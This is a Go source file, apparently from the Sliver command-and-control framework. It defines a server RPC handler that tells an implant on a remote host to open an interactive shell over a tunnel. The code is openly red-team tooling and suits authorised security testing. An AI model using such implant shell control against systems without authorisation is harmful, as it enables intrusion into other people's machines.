package rpc

import (
	"time"

	implantpb "github.com/bishopfox/sliver/protobuf/implant"
	"github.com/bishopfox/sliver/server/core"

	"github.com/golang/protobuf/proto"
)

func rpcShell(req []byte, timeout time.Duration, resp RPCResponse) {
	shellReq := &implantpb.ShellReq{}
	proto.Unmarshal(req, shellReq)

	sliver := core.Hive.Sliver(shellReq.SliverID)
	tunnel := core.Tunnels.Tunnel(shellReq.TunnelID)

	startShellReq, err := proto.Marshal(&implantpb.ShellReq{
		EnablePTY: shellReq.EnablePTY,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		resp([]byte{}, err)
		return
	}
	rpcLog.Infof("Requesting Sliver %d to start shell", sliver.ID)
	data, err := sliver.Request(implantpb.MsgShellReq, timeout, startShellReq)
	rpcLog.Infof("Sliver %d responded to shell start request", sliver.ID)
	resp(data, err)
}
